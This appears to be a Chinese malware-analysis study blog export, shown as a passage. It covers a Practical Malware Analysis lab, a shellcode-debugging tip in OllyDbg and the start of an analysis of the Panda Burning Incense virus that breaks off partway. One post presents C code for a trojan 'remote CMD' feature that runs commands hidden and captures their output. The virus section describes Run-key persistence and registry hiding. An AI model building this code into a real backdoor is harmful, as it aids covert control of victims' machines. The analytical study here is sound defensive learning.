class="hljs-built_in">cmd</span>.exe被启动后，所有经过套接字的数据都将发送到<span class="hljs-built_in">cmd</span>.exe，并且<span class="hljs-built_in">cmd</span>.exe产生的所有输出都将通过套接字发出。<br></code></pre></div></td></tr></table></figure><p>这里我并没有分析出来，就借用了书上的解答。</p><h2 id="Lab-9-3"><a href="#Lab-9-3" class="headerlink" title="Lab 9-3"></a>Lab 9-3</h2><h3 id="详细分析-2"><a href="#详细分析-2" class="headerlink" title="详细分析"></a>详细分析</h3><p>整体流程也是比较简单的，可以看到首先是调用了三个DLL中的函数，然后是writefile函数向某文件写入数据。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.1.png"></p><p>运行DLL主要会打印出这三行信息，下面来仔细分析一下到底做了什么。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.2.png"></p><h4 id="DLL1"><a href="#DLL1" class="headerlink" title="DLL1"></a>DLL1</h4><p>先来看看第一个DLL。</p><p>可以看到这是DLL1Print函数，其中dword_10008030就是打印的数据，可以查看交叉引用，看看究竟是什么。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.3.png"></p><p>可以看到这个值是当前进程的PID</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.4.png"></p><h4 id="DLL2"><a href="#DLL2" class="headerlink" title="DLL2"></a>DLL2</h4><p>再来看第二个DLL，这是导出函数 DLL2Print，看到dword_1000B078是其打印的数据，还是交叉引用查看。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.5.png"></p><p>可以看到是这个数据是创建文件的句柄。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.6.png"></p><p>而另一个导出函数DLL2ReturnJ可以看到返回了一个值，从上图可以看到这个值就是文件的句柄。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.7.png"></p><h4 id="DLL3"><a href="#DLL3" class="headerlink" title="DLL3"></a>DLL3</h4><p>DLL3有两个导出函数</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.8.png"></p><p>DLL3Print打印信息，可以看到是&amp;WideCharStr，交叉引用查看。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.9.png"></p><p>可以看到这是MultiByteToWideChar函数的一个参数，而这个参数作用是</p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">lpMultiByteStr</span><br>指向要转换的字符串的指针。<br></code></pre></div></td></tr></table></figure><p>这个函数作用是将字符串映射到 UTF-16（宽字符）字符串，也就是&amp;WideCharStr这其中保存着转为宽字符后的数据的地址。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.10.png"></p><p>导出函数DLL3GetStructure返回了一个值，从上图可以看出，这里其实是返回了一个结构体的地址。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.11.png"></p><h3 id="1-Lab9-3-exe导入了哪些DLL？"><a href="#1-Lab9-3-exe导入了哪些DLL？" class="headerlink" title="1.Lab9-3.exe导入了哪些DLL？"></a>1.Lab9-3.exe导入了哪些DLL？</h3><p>导入了四个DLL</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.12.png"></p><h3 id="2-DLL1-dll、DLL2-dll、DLL3-dll要求的基址是多少？"><a href="#2-DLL1-dll、DLL2-dll、DLL3-dll要求的基址是多少？" class="headerlink" title="2.DLL1.dll、DLL2.dll、DLL3.dll要求的基址是多少？"></a>2.DLL1.dll、DLL2.dll、DLL3.dll要求的基址是多少？</h3><p>都是10000000</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.13.png"></p><h3 id="3-当使用OD调试时，为DLL1-dll、DLL2-dll、DLL3-dll分配的基址是什么？"><a href="#3-当使用OD调试时，为DLL1-dll、DLL2-dll、DLL3-dll分配的基址是什么？" class="headerlink" title="3.当使用OD调试时，为DLL1.dll、DLL2.dll、DLL3.dll分配的基址是什么？"></a>3.当使用OD调试时，为DLL1.dll、DLL2.dll、DLL3.dll分配的基址是什么？</h3><p>分别是200000,、210000、220000</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.14.png"></p><h3 id="4-当调用DLL1-dll中的一个导入函数时，这个导入函数都做了些什么？"><a href="#4-当调用DLL1-dll中的一个导入函数时，这个导入函数都做了些什么？" class="headerlink" title="4.当调用DLL1.dll中的一个导入函数时，这个导入函数都做了些什么？"></a>4.当调用DLL1.dll中的一个导入函数时，这个导入函数都做了些什么？</h3><p>打印出了当前的进程的PID</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.15.png"></p><h3 id="5-当调用writefile函数时，写入的文件名是什么？"><a href="#5-当调用writefile函数时，写入的文件名是什么？" class="headerlink" title="5.当调用writefile函数时，写入的文件名是什么？"></a>5.当调用writefile函数时，写入的文件名是什么？</h3><p>temp.txt</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.16.png"></p><h3 id="6-当调用NetScheduleJobAdd创建一个job时，从哪里获取第二个参数的数据？"><a href="#6-当调用NetScheduleJobAdd创建一个job时，从哪里获取第二个参数的数据？" class="headerlink" title="6.当调用NetScheduleJobAdd创建一个job时，从哪里获取第二个参数的数据？"></a>6.当调用NetScheduleJobAdd创建一个job时，从哪里获取第二个参数的数据？</h3><p>从DLL3中的DLL3GetStructure获取</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.17.png"></p><h3 id="7-在运行或调试时，会看到程序打印出三块神秘数据。DLL1-dll、DLL2-dll、DLL3-dll它们的神秘数据分别什么？"><a href="#7-在运行或调试时，会看到程序打印出三块神秘数据。DLL1-dll、DLL2-dll、DLL3-dll它们的神秘数据分别什么？" class="headerlink" title="7.在运行或调试时，会看到程序打印出三块神秘数据。DLL1.dll、DLL2.dll、DLL3.dll它们的神秘数据分别什么？"></a>7.在运行或调试时，会看到程序打印出三块神秘数据。DLL1.dll、DLL2.dll、DLL3.dll它们的神秘数据分别什么？</h3><p>前面详细分析可知，第一个是当前进程的PID，第二个是文件句柄，第三个是保存着宽字符数据的地址。</p><h3 id="8-如何将DLL2-dll加载到IDA-PRO中，使得它与OD使用的加载地址匹配？"><a href="#8-如何将DLL2-dll加载到IDA-PRO中，使得它与OD使用的加载地址匹配？" class="headerlink" title="8.如何将DLL2.dll加载到IDA PRO中，使得它与OD使用的加载地址匹配？"></a>8.如何将DLL2.dll加载到IDA PRO中，使得它与OD使用的加载地址匹配？</h3><p>可以在IDA里Edit–&gt;Segments–&gt;Rebase Program改变基址</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.18.png"></p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shellcode的分析调试小技巧</title>
    <link href="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <url>/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<h3 id="分析shellcode"><a href="#分析shellcode" class="headerlink" title="分析shellcode"></a>分析shellcode</h3><p>OD有一种简单的分析shellcode的方法。</p><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>首先是复制shellcode</p><p>这里我用自己写的弹窗小程序，并且使用十六进制编辑器WINHEX进行复制。</p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>然后是打开OD，附加任意一个程序，打开内存映射窗口，快捷操作就是上面的M，然后寻找类型为Priv的内存区域（这是分配给进程的私有内存，与只读的可执行镜像不同，这些内存被多个进程共享），选择它。</p><p><img src="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/1.png"></p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>选中一大片区域，然后将复制的数据粘贴进去<br><img src="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/2.png"></p><p>可以右键选择反汇编，这样就会显示汇编代码，而不是十六进制数据，复制后如图所示。<br><img src="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/3.png"></p><h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>在反汇编窗口中跳到地址，可以在上面图中看到首地址是12D000，那么在反汇编窗口中跳到此地址，然后选择设置为新的EIP，这样就就可以开始调试shellcode了。</p><p><img src="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/4.png"></p><p>调试到弹窗的地方<br><img src="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/5.png"></p><p>这样可以方便调试shellcode，感觉还是很方便的。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《恶意代码分析实战》</p>]]></content>
    
    
    <categories>
      
      <category>病毒分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>功能技术远程CMD</title>
    <link href="/2021/08/30/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF%E8%BF%9C%E7%A8%8BCMD/"/>
    <url>/2021/08/30/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF%E8%BF%9C%E7%A8%8BCMD/</url>
    
    <content type="html"><![CDATA[<h2 id="远程CMD"><a href="#远程CMD" class="headerlink" title="远程CMD"></a>远程CMD</h2><p>CMD，提示进行命令输入的一种工作提示符，在windows系统下，相当于在windows窗口使用的DOS系统，简单来讲，CMD就是通过命令行实现键鼠的操作。</p><p>现在介绍的远程CMD是指病毒木马获取控制端发送过来的CMD命令，执行后将结果回传给控制端。</p><p>有许多的API都可以实现CMD命令，比如WinExec,CreateProcess但是这些函数不能获取执行后的操作结果。所以实现远程CMD的关键是获取CMD的执行结果，接下来介绍如何执行CMD，并通过匿名管道的方法获取执行结果，实现远程CMD。</p><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="CreatePipe"><a href="#CreatePipe" class="headerlink" title="CreatePipe"></a>CreatePipe</h3><p>创建一个匿名管道，并从中得到读写管道的句柄。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">CreatePipe</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  PHANDLE               hReadPipe,</span></span><br><span class="hljs-params"><span class="hljs-function">  PHANDLE               hWritePipe,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD                 nSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>hReadPipe：返回一个刻度管道数据的文件句柄。</p><p>hWritePipe：返回一个可写管道数据的文件句柄。</p><p>lpPipeAttributes：传入一个SECURITY_ATTRIBUTES结构的指针，该结构决定此函数返回的句柄是否可由子进程继承。如果传入为NUL，则不可进程。</p><p>nSize：指向管道的缓冲区大小。但是这仅仅是一个理想值，系统根据这个值创建大小相近的缓冲区。如果传入0，那么系统将使用一个默认的缓冲区大小。</p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>如果函数成功，则返回值不为0；</p><p>如果函数失败，则返回值为0。</p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>管道是一种在进程间共享数据的机制，其实质是一段共享内存。windows系统为这段共享的内存设计使用数据流I/O的方式来访问。一个进程读，另一个进程写，这类似一个管道的两端。实现远程CMD的流程如下：</p><p>首先初始化匿名管道的安全属性结构SECURITY_ATTRIBUTES，调用CreatePipe函数创建匿名管道，获取管道数据读取句柄和管道数据写入句柄。</p><p>对即将创建的进程结构体STARTUPINFO进行初始化，隐藏进程窗口，并把上面的管道数据写入句柄赋值给新进程控制台窗口的缓存句柄，这样，新进程会把窗口缓存的输出数据写入到匿名管道中。</p><p>调用CreateProcess函数创建新的进程，执行CMD命令，并调用WaitForSingleObject等待命令执行完毕。执行完毕后，就调用ReadFile函数根据匿名管道的数据读取句柄从匿名管道的缓冲区中读取数据，这个数据就是命令的返回结果。</p><p>最后便可以关闭句柄，释放资源。</p><h2 id="编码实现"><a href="#编码实现" class="headerlink" title="编码实现"></a>编码实现</h2><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">#<span class="hljs-keyword">include</span> &lt;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Windows</span>.</span></span>h&gt;<br>#<span class="hljs-keyword">include</span> &lt;stdio.h&gt;<br>BOOL <span class="hljs-constructor">PipeCmd(<span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">pszCmd</span>, <span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">pszResultBuffer</span>, DWORD <span class="hljs-params">dwBufferSize</span>)</span>;<br><span class="hljs-built_in">int</span> main<span class="hljs-literal">()</span><br>&#123;<br><span class="hljs-comment">//执行的CMD命令</span><br><span class="hljs-built_in">char</span> pszCmd<span class="hljs-literal">[]</span> = <span class="hljs-string">&quot;ping www.baidu.com&quot;</span>;<br><span class="hljs-built_in">char</span> pszResultBuffer<span class="hljs-literal">[<span class="hljs-number">1024</span>]</span> = &#123; <span class="hljs-number">0</span> &#125;;<br>DWORD dwBufferSize = <span class="hljs-number">1024</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-constructor">PipeCmd(<span class="hljs-params">pszCmd</span>, <span class="hljs-params">pszResultBuffer</span>, <span class="hljs-params">dwBufferSize</span>)</span><span class="hljs-operator"> == </span>TRUE)<br>&#123;<br>printf(<span class="hljs-string">&quot;执行成功:\n%s\n&quot;</span>,pszResultBuffer);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>printf(<span class="hljs-string">&quot;执行失败\n&quot;</span>);<br>&#125;<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br>return <span class="hljs-number">0</span>;<br>&#125;<br>BOOL <span class="hljs-constructor">PipeCmd(<span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">pszCmd</span>, <span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">pszResultBuffer</span>, DWORD <span class="hljs-params">dwBufferSize</span>)</span><br>&#123;<br>HANDLE hReadPipe = NULL;<br>HANDLE hWritePipe = NULL;<br>SECURITY_ATTRIBUTES SEA = &#123; <span class="hljs-number">0</span> &#125;;<br>BOOL bRet = FALSE;<br>STARTUPINFO si = &#123; <span class="hljs-number">0</span> &#125;;<br>PROCESS_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br><br><span class="hljs-comment">//设定管道的安全属性</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SEA</span>.</span></span>bInheritHandle = TRUE;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SEA</span>.</span></span>nLength = sizeof(SEA);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SEA</span>.</span></span>lpSecurityDescriptor = NULL;<br><span class="hljs-comment">//创建匿名管道</span><br>bRet = <span class="hljs-constructor">CreatePipe(&amp;<span class="hljs-params">hReadPipe</span>, &amp;<span class="hljs-params">hWritePipe</span>, &amp;SEA, 0)</span>;<br><span class="hljs-keyword">if</span> (bRet<span class="hljs-operator"> == </span>FALSE)<br>&#123;<br>printf(<span class="hljs-string">&quot;创建管道失败\n&quot;</span>);<br>return bRet;<br>&#125;<br><span class="hljs-comment">//设置新进程的参数</span><br>si.cb = sizeof(si);<br>si.hStdError = hWritePipe;<br>si.hStdOutput = hWritePipe;<br>si.wShowWindow = SW_HIDE;<br>si.dwFlags = STARTF_USESHOWWINDOW <span class="hljs-pattern-match">| <span class="hljs-constructor">STARTF_USESTDHANDLES</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>创建新进程执行<span class="hljs-constructor">CMD</span>命令</span><br><span class="hljs-pattern-match">b<span class="hljs-constructor">Ret</span> = <span class="hljs-constructor">CreateProcess(NULL, <span class="hljs-params">pszCmd</span>, NULL, NULL, TRUE, 0, NULL, NULL, &amp;<span class="hljs-params">si</span>, &amp;<span class="hljs-params">pi</span>)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-keyword">if</span> (b<span class="hljs-constructor">Ret</span> <span class="hljs-operator">==</span> <span class="hljs-constructor">FALSE</span>)</span><br><span class="hljs-pattern-match">&#123;</span><br><span class="hljs-pattern-match">printf(&quot;创建进失败\n&quot;);</span><br><span class="hljs-pattern-match">return b<span class="hljs-constructor">Ret</span>;</span><br><span class="hljs-pattern-match">&#125;</span><br><span class="hljs-pattern-match"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>等待执行结束</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">WaitForSingleObject(<span class="hljs-params">pi</span>.<span class="hljs-params">hThread</span>, INFINITE)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">WaitForSingleObject(<span class="hljs-params">pi</span>.<span class="hljs-params">hProcess</span>, INFINITE)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>从匿名管道中读取结果到输出缓冲区</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">RtlZeroMemory(<span class="hljs-params">pszResultBuffer</span>, <span class="hljs-params">dwBufferSize</span>)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">ReadFile(<span class="hljs-params">hReadPipe</span>, <span class="hljs-params">pszResultBuffer</span>, <span class="hljs-params">dwBufferSize</span>, NULL, NULL)</span>;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>关闭句柄</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">CloseHandle(<span class="hljs-params">pi</span>.<span class="hljs-params">hThread</span>)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">CloseHandle(<span class="hljs-params">pi</span>.<span class="hljs-params">hProcess</span>)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">CloseHandle(<span class="hljs-params">hWritePipe</span>)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">CloseHandle(<span class="hljs-params">hReadPipe</span>)</span>;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">return b<span class="hljs-constructor">Ret</span>;</span><br><span class="hljs-pattern-match">&#125;</span><br></code></pre></div></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>执行Ping baidu的命令，查看效果</p><p><img src="/2021/08/30/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF%E8%BF%9C%E7%A8%8BCMD/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>功能技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>熊猫烧香病毒分析</title>
    <link href="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <url>/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>熊猫烧香做为非常经典的病毒之一，可以说已经被分析烂了，网上也有许许多多的分析流程。作为病毒分析的一个初学者，我现在也尝试分析一下熊猫烧香，争取能够分析的比较清楚， 也能够学到一些东西。</p><h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><p>样本的基本信息</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1.png"></p><h2 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h2><p>使用Process Monitor监控行为</p><p>可以看到panda.exe向C:\Windows\System32\drivers文件夹下释放了一个文件spcolsv.exe</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/2.png"></p><p>启动了spcolsv.exe这个进程</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/3.png"></p><p>然后病毒的主体panda.exe将自身关闭</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/4.png"></p><p>spcolsv.exe进程中有大量的文件操作</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/5.png"></p><p>查看注册表的set操作，看到病毒在图中两个路径下设置了键值。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/6.png"></p><p>HKCU\Software\Microsoft\Windows\CurrentVersion\Run与自启动相关，病毒在其中设置键值，实现自启动。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/7.png"></p><p>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue这个键值主要是是否显示隐藏文件，当它为0时候，就是不显示隐藏的文件。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/8.png"></p><p>查看电脑上的文件时，会发现图标都被改成了熊猫烧香的图标。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/9.png"></p><p>现在大致清理一下思路，病毒主体为panda.exe，打开后，它会释放一个spcolsv.exe到C:\Windows\System32\drivers文件夹下，然后关闭自身，启动spcolsv.exe。spcolsv.exe有大量的文件操作，应该是和修改图标有关，同时还通过设置注册表键值，实现了自启动，和不显示隐藏的文件。</p><h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>首先进入函数，是两个解密的函数，解密后进行比较，如果字符串不相等就会退出程序。那么可以看到，病毒的实际操作就是在比较之后的三个函数内，操作1,2,3，现在具体进入其中进行分析。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/10.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/11.png"></p><h3 id="操作1"><a href="#操作1" class="headerlink" title="操作1"></a>操作1</h3><p>在这里主要是病毒的主体程序的运行和被感染的EXE程序的运行。</p><h4 id="病毒主体panda-exe和spcolsv-exe流程"><a href="#病毒主体panda-exe和spcolsv-exe流程" class="headerlink" title="病毒主体panda.exe和spcolsv.exe流程"></a>病毒主体panda.exe和spcolsv.exe流程</h4><p>判断当前病毒运行的目录下是否存在一个Desktop.ini文件，如果存在会将其删除。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/12.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/12-1.png"></p><p>继续往下走，会判断当前的程序是否是C:\Windows\system32\drives\spcolsv.exe，如果不是还会判断当前是否存在这个进程spcolsv.exe，如果存在将其关闭。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/16.png"></p><p><img 